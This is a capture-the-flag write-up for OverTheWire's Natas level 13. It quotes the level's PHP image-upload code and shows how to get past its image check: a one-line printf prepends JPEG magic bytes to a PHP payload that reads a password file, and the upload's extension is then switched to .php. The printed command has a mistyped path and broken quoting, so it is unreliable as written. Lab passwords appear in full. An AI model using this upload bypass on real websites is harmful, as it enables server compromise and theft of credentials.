# Natas 12 - Natas 13
    Username  : natas13
    Password  : trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
    URL       : http://natas13.natas.labs.overthewire.org
# Solution
In the source page 
```
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```
It is very similar to the previous level but this time it only accepts a image file we can not uploda our code file . 
But we can still uplode our own code into it by adding a file header to make it look like a jpg file . 


A file signature is data used to identify or verify the content of a file. 
Such signatures are also known as magic numbers or magic bytes and are usually inserted at the beginning of the file.

We can use the command :

    printf "\xff\xd8\xff\xee<?php echo exec("cat /etc.natas_webpass_natas14");" > natas13.php

Which pre-process the hexadecimal string and make it look like a file . Now upload that file and change the extension from .jpg to .php in the elements tab of the inspect page . After submitting we can find the password for next level

# Password 
    z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
